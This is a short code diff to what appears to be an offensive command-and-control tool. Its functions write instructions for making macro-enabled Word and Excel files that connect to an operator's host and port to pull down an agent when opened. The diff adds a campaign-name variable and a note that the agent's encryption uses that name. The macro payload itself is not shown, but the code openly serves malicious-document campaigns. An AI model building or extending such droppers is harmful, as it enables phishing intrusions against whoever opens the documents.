@@ -3,6 +3,10 @@ import os
 def generate_word_macro_str(host, port, ssl, campaign_folder):
     agents_folder = os.path.join(campaign_folder, "agents")
     os.makedirs(agents_folder, exist_ok=True)
+    
+    # Extract campaign name from folder path
+    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
+    
     http = "https" if ssl else "http"
     raw_agent = "/raw_agent"
     
@@ -54,6 +58,7 @@ def generate_word_macro_str(host, port, ssl, campaign_folder):
     
     6. Save the document as a macro-enabled document (.docm)
     7. When the document is opened, it will connect to: {http}://{host}:{port}{raw_agent}
+    8. The agent will use encryption with campaign name: {campaign_name}
     """
     
     instruction_file_path = os.path.join(agents_folder, "Word_macro_instructions.txt")
@@ -66,6 +71,10 @@ def generate_word_macro_str(host, port, ssl, campaign_folder):
 def generate_excel_macro_str(host, port, ssl, campaign_folder):
     agents_folder = os.path.join(campaign_folder, "agents")
     os.makedirs(agents_folder, exist_ok=True)
+    
+    # Extract campaign name from folder path
+    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
+    
     http = "https" if ssl else "http"
     raw_agent = "/raw_agent"
     
@@ -117,6 +126,7 @@ def generate_excel_macro_str(host, port, ssl, campaign_folder):
     
     6. Save the workbook as a macro-enabled workbook (.xlsm)
     7. When the workbook is opened, it will connect to: {http}://{host}:{port}{raw_agent}
+    8. The agent will use encryption with campaign name: {campaign_name}
     """
     
     instruction_file_path = os.path.join(agents_folder, "Excel_macro_instructions.txt")
